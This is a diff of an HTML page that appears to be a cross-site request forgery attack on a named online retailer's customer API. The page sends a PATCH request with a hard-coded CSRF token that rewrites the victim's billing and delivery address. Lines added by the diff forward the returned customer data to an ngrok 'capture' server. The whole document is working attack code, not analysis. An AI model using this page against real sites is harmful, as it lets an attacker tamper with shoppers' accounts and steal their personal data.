@@ -1,10 +1,6 @@
 <!DOCTYPE html>
 <html>
 <body>
-    <form id="evilForm" method="PATCH" action="https://www.boozt.com/at/de-at/api/customer">
-        <input type="hidden" name="data" value='{"requisites":{"billing_firstname":"Hacked","billing_lastname":"ByMe","billing_street":"EvilStreet","billing_postcode":"666","billing_city":"Hell","billing_country":"pt","delivery_firstname":"Hacked","delivery_lastname":"ByMe","delivery_street":"EvilStreet","delivery_postcode":"666","delivery_city":"Hell","delivery_country":"pt","delivery_as_billing":true}}'>
-        <input type="hidden" name="Csrf-Token" value="f7b24e74899ced25052be23894053aab">
-    </form>
     <script>
         fetch("https://www.boozt.com/at/de-at/api/customer", {
             method: "PATCH",
@@ -12,8 +8,34 @@
                 "Content-Type": "application/json",
                 "Csrf-Token": "f7b24e74899ced25052be23894053aab"
             },
-            body: JSON.stringify({"requisites":{"billing_firstname":"Hacked","billing_lastname":"ByMe","billing_street":"EvilStreet","billing_postcode":"666","billing_city":"Hell","billing_country":"pt","delivery_firstname":"Hacked","delivery_lastname":"ByMe","delivery_street":"EvilStreet","delivery_postcode":"666","delivery_city":"Hell","delivery_country":"pt","delivery_as_billing":true}})
-        }).then(response => response.json()).then(data => console.log(data));
+            body: JSON.stringify({
+                "requisites": {
+                    "billing_firstname": "Hacked",
+                    "billing_lastname": "ByMe",
+                    "billing_street": "EvilStreet",
+                    "billing_postcode": "666",
+                    "billing_city": "Hell",
+                    "billing_country": "pt",
+                    "delivery_firstname": "Hacked",
+                    "delivery_lastname": "ByMe",
+                    "delivery_street": "EvilStreet",
+                    "delivery_postcode": "666",
+                    "delivery_city": "Hell",
+                    "delivery_country": "pt",
+                    "delivery_as_billing": true
+                }
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            // Enviar os dados para o seu servidor
+            fetch("https://54b7-2804-4580-1080-7db-e5f3-62e8-de0e-c67e.ngrok-free.app/capture", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(data)
+            });
+        })
+        .catch(error => console.error("Erro:", error));
     </script>
 </body>
 </html>
